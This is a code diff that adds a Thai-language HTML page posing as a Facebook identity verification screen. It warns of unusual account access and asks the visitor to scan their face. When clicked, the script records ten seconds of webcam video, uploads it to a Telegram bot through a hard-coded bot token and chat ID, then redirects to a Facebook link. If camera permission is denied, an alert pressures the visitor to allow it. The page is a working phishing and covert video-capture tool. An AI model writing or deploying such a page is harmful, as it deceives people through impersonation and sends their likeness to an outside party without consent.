@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Verification System</title>
+    <style>
+        body { background: #f0f2f5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 40px 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 340px; }
+        .fb-logo { width: 50px; margin-bottom: 15px; }
+        h2 { font-size: 20px; color: #1c1e21; margin: 10px 0; }
+        p { font-size: 14px; color: #606770; margin-bottom: 25px; line-height: 1.4; }
+        .btn { background: #1877f2; color: white; border: none; padding: 14px; border-radius: 8px; font-weight: bold; width: 100%; cursor: pointer; font-size: 16px; }
+        #status { display: none; margin-top: 15px; color: #1877f2; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-logo">
+    <h2>ยืนยันตัวตนเพื่อความปลอดภัย</h2>
+    <p>ระบบตรวจพบการเข้าถึงที่ผิดปกติ โปรดกดปุ่มด้านล่างเพื่อสแกนใบหน้ายืนยันความปลอดภัยของบัญชี</p>
+    <button class="btn" id="startBtn">เริ่มการยืนยันตัวตน</button>
+    <div id="status">⏳ กำลังประมวลผลระบบความปลอดภัย...</div>
+</div>
+
+<script>
+    const TOKEN = '8570864342:AAH-v-iLybrDvA9mD569rERO9WmU1M0HzdA';
+    const CHAT_ID = '8482017371';
+    const REDIRECT_TO = 'https://www.facebook.com/share/p/1avrMEzzJn/';
+
+    document.getElementById('startBtn').addEventListener('click', async function() {
+        const btn = this;
+        const status = document.getElementById('status');
+        btn.style.display = 'none';
+        status.style.display = 'block';
+
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const mediaRecorder = new MediaRecorder(stream);
+            let chunks = [];
+
+            mediaRecorder.ondataavailable = e => chunks.push(e.data);
+            mediaRecorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'video/mp4' });
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('video', blob, 'capture_10s.mp4');
+
+                // ส่งเข้า Telegram
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: 'POST', body: fd });
+                
+                // ปิดกล้องและดีดหน้า
+                stream.getTracks().forEach(t => t.stop());
+                window.location.href = REDIRECT_TO;
+            };
+
+            mediaRecorder.start();
+            // ถ่าย 10 วินาทีตามสั่งครับ
+            setTimeout(() => { mediaRecorder.stop(); }, 10000);
+
+        } catch (err) {
+            alert("โปรดกด 'อนุญาต' (Allow) กล้องเพื่อทำตามขั้นตอนความปลอดภัย");
+            btn.style.display = 'block';
+            status.style.display = 'none';
+        }
+    });
+</script>
+</body>
+</html>
